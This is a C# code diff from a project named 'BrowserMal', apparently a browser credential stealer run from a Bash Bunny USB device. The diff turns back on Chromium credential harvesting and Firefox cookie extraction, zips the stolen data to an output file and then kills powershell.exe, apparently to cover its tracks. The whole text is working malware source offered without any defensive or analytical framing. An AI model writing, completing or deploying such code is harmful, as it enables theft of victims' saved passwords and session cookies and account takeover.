@@ -12,19 +12,21 @@ namespace BrowserMal
         private static readonly GeckoBrowserManager geckoBrowserManager = new GeckoBrowserManager();
         private static readonly Dictionary<string, string> list = new Dictionary<string, string>();
 
-        public static void StartCreds()
+        public static void StartCreds(string output = "")
         {
-            /*browserManager.Init();
-            List<BrowserModel> browsersChromium = browserManager.GetBrowsers();*/
+            browserManager.Init();
+            List<BrowserModel> browsersChromium = browserManager.GetBrowsers();
 
             geckoBrowserManager.Init();
             List<BrowserModel> browsersGecko = geckoBrowserManager.GetBrowsers();
 
-            //Chromium(ref browsersChromium);
+            Chromium(ref browsersChromium);
             Gecko(ref browsersGecko);
 
             Extration();
-            //ProcessUtil.KillProcessDelayed(1, "powershell.exe");
+
+            Filesaver.FileManager.SaveBytes(output, Zip.ZipArchives(list));
+            ProcessUtil.KillProcessDelayed(1, "powershell.exe");
         }
 
         private static void Extration()
@@ -103,7 +105,7 @@ namespace BrowserMal
             geckoCookies.SetIsSqlite(true);
             geckoCookies.SetFileName("cookies.sqlite");
 
-            //list.AddRange(geckoCookies.Init(ref browsers));
+            list.AddRange(geckoCookies.Init(ref browsers));
         }
 
         private static string GetBashBunny() => RemovableDisks.FindBashBunny();
